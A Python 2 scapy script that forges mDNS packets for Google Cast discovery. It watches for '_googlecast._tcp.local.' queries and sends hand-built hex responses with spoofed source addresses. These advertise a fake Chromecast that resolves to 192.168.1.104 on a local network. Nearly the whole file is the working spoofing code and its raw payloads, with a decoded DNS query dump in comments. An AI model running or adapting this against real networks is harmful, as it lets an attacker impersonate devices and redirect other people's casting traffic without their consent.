#!/usr/bin/env python
# -*- coding: utf-8 -*-
#python 2.7
from scapy.all import *
from struct import pack
from time import sleep
#import binascii
## Create a Packet Count var
packetCount = 0

def dns_spoof(pkt):
    redirect_to = '192.168.1.104'
    data = "00 00 00 00 00 01 00 00 00 00 00 00 0b 5f 67 6f 6f 67 6c 65 63 61 73 74 04 5f 74 63 70 05 6c 6f 63 61 6c 00 00 0c 80 01"
    data_list = data.split()
    data_hex = ''.join(data_list).decode('hex')
    spoofed_pkt = IP(src='192.168.100.145', dst=redirect_to)/UDP(dport='mdns', sport='mdns')/Raw(load=data_hex)

    send(spoofed_pkt)
    print 'Sent:', spoofed_pkt.summary()

def spoof_response():
    ans = '00 00 84 00 00 00 00 01 00 00 00 03 0b 5f 67 6f 6f 67 6c 65 63 61 73 74 04 5f 74 63 70 05 6c 6f 63 61 6c 00 00 0c 00 01 00 00 00 78 00 2e 2b 43 68 72 6f 6d 65 63 61 73 74 2d 62 33 66 64 66 31 61 66 34 35 63 62 31 64 32 30 63 39 37 35 31 33 34 32 30 37 37 36 36 31 65 38 c0 0c'
    #TXT record
    ansextratxt =  'c0 2e 00 10 80 01 00 00 11 94 00 9b 23 69 64 3d 62 33 66 64 66 31 61 66 34 35 63 62 31 64 32 30 63 39 37 35 31 33 34 32 30 37 37 36 36 31 65 38 13 72 6d 3d 43 45 32 33 46 44 38 39 44 36 41'
    ansextratxt += '38 41 37 31 33 05 76 65 3d 30 35 0d 6d 64 3d 43 68 72 6f 6d 65 63 61 73 74 12 69 63 3d 2f 73 65 74 75 70 2f 69 63 6f 6e 2e 70 6e 67 1a 66 6e 3d 55 52 4d 4f 4d 54 49 54 53 6c 6f 6c 54 65 65'
    ansextratxt += '68 65 68 65 4c 4f 4c 5a 07 63 61 3d 34 31 30 31 04 73 74 3d 30 0f 62 73 3d 46 41 38 46 43 41 38 30 42 30 36 39 03 72 73 3d'
    #SRV record
    ansextrasrv =  'c0 2e 00 21 80 01 00 00 00 78 00 2d 00 00 00 00 1f 49 24 62 33 66 64 66 31 61 66 2d 34 35 63 62 2d 31 64 32 30 2d 63 39 37 35 2d 31 33 34 32 30 37 37 36 36 31 65 38 c0 1d'
    #A record
    ansextraa   =  'c1 15 00 01 80 01 00 00 00 78 00 04 c0 a8 01 68'
    #ansextraa   =  'c1 15 00 01 80 01 00 00 00 78 00 04 C0A86490'

    #ansextra = ansextratxt + ansextrasrv + ansextraa
    ansextra = ansextraa
    ans += ansextra

    data_list = ans.split()
    data_hex = ''.join(data_list).decode('hex')

    #spoofed_pkt = IP(src='192.168.1.104', dst='224.0.0.251')/UDP(dport='mdns', sport='mdns')/Raw(load=data_hex)
    spoofed_pkt = IP(src='192.168.1.104', dst='192.168.100.147')/UDP(dport='mdns', sport='mdns')/Raw(load=data_hex)

    send(spoofed_pkt)

    ping = IP(dst="192.168.100.147",  ttl=20)/ICMP()
    send(ping)
    print 'Sent spoofed response:', spoofed_pkt.summary()


## Define our Custom Action function
def customAction(packet):
    global packetCount
    packetCount += 1
    #print packet.show()
    if DNSQR in packet:
        if packet[DNSQR].qname == '_googlecast._tcp.local.':
            if packet[IP].dst != '192.168.1.104':
                print 'chromecast is being looked for'
                #flip the QU bit to true
                dns_spoof(packet)
                spoof_response()
                return "Packet #%s: %s ==> %s" % (packetCount, packet[0][1].src, packet[0][1].dst)
## Setup sniff, filtering for IP traffic
#sniff(filter="ip", prn=customAction)
#sniff(filter="ip and udp port mdns", prn=customAction)

spoof_response()
#spoof_response()
#def main():
#    dns_spoof("tst")

#main()
#MDNS
###[ DNS ]###
#          id        = 0
#          qr        = 0L
#          opcode    = QUERY
#          aa        = 0L
#          tc        = 0L
#          rd        = 0L
#          ra        = 0L
#          z         = 0L
#          ad        = 0L
#          cd        = 0L
#          rcode     = ok
#          qdcount   = 1
#          ancount   = 0
#          nscount   = 0
#          arcount   = 0
#          \qd        \
#           |###[ DNS Question Record ]###
#           |  qname     = '_googlecast._tcp.local.'
#           |  qtype     = PTR
#           |  qclass    = IN
#          an        = None
#          ns        = None
#          ar        = None
